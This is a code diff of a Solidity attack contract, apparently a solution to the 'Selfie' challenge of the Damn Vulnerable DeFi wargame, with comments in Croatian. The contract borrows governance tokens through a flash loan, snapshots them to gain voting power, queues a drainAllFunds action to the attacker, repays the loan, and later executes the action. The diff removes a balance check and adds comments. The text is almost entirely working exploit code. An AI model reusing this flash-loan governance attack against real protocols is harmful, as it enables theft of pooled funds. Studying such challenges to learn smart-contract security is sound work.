@@ -41,17 +41,18 @@ contract DrainSelfiePool {
 
     //poziv funkcije kod flashLoan poziva na selfiePool contractu
     function receiveTokens(address tokenAddress, uint256 borrowAmmount) external {
-        require(DamnValuableTokenSnapshot(tokenAddress).balanceOf(address(this))==borrowAmmount,"Greska trasnfera");
         //predlozi akciju u governance contractu -> postavi parametre funckije u calldata parametru
         //naprai snapshot tokena kad priimo tokene
-        DamnValuableTokenSnapshot(tokenAddress).snapshot();//važno-> potrebno napravit snapshot jer se u governance gleda zadnji snapshot a mi zelimo da se gleda snapshot u kojem mi imamo posudene tokene
+        DamnValuableTokenSnapshot(tokenAddress).snapshot();//važno-> potrebno napravit snapshot jer se u governance gleda zadnji snapshot a mi zelimo da se gleda snapshot u kojem mi imamo posudene 
         //S OBIZROM NA OVAJ NAJNOVIJI SNAPSHOT SE ODREDUJU ODREDUJU VOTING PRAVA
         governanceActionId=IGovernance(governance).queueAction(selfiePool,abi.encodeWithSignature("drainAllFunds(address)",owner),0);
         //vrati flash loan
         DamnValuableTokenSnapshot(tokenAddress).transfer(selfiePool,borrowAmmount);
     }
 
+    //poziv nakon vremenskog roka
     function drainPool() external{
+        //pozovi prethodno proposanu gonvernance akciju
         IGovernance(governance).executeAction(governanceActionId);
     }
 }
